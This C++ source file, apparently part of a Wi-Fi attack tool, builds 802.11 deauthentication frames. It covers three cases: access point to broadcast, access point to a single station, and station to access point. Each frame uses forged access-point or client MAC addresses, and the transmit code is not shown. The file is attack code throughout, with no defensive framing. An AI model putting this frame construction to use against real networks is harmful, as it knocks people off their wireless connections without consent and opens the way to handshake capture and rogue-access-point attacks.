// DeauthAttack.cpp

#include "DeauthAttack.h"

void InitDeauthPacket(DeauthPacket* packet)
{
    memset(packet, 0x00, sizeof(DeauthPacket));
    packet->radiotab[2] = 0x0b;
    packet->radiotab[5] = 0x80;
    packet->radiotab[6] = 0x02;
    packet->type = DeauthPacket::TYPE;
    packet->management[0] = 0x07;
}

// AP -> broadcast
void InitDeauthApBroadcast(DeauthPacket* packet, Mac& apMac)
{
    InitDeauthPacket(packet);
    memset(packet->receiver, 0xff, Mac::SIZE);
    memcpy(packet->transmitter, (uint8_t*)apMac, Mac::SIZE);
    memcpy(packet->bssid, (uint8_t*)apMac, Mac::SIZE);
}

// AP -> station
void InitDeauthApUnicast(DeauthPacket* packet, Mac& apMac, Mac& staMac)
{
    InitDeauthPacket(packet);
    memcpy(packet->receiver, (uint8_t*)staMac, Mac::SIZE);
    memcpy(packet->transmitter, (uint8_t*)apMac, Mac::SIZE);
    memcpy(packet->bssid, (uint8_t*)apMac, Mac::SIZE);
}

// station -> AP
void InitDeauthStaUnicast(DeauthPacket* packet, Mac& apMac, Mac& staMac)
{
    InitDeauthPacket(packet);
    memcpy(packet->receiver, (uint8_t*)apMac, Mac::SIZE);
    memcpy(packet->transmitter, (uint8_t*)staMac, Mac::SIZE);
    memcpy(packet->bssid, (uint8_t*)apMac, Mac::SIZE);
}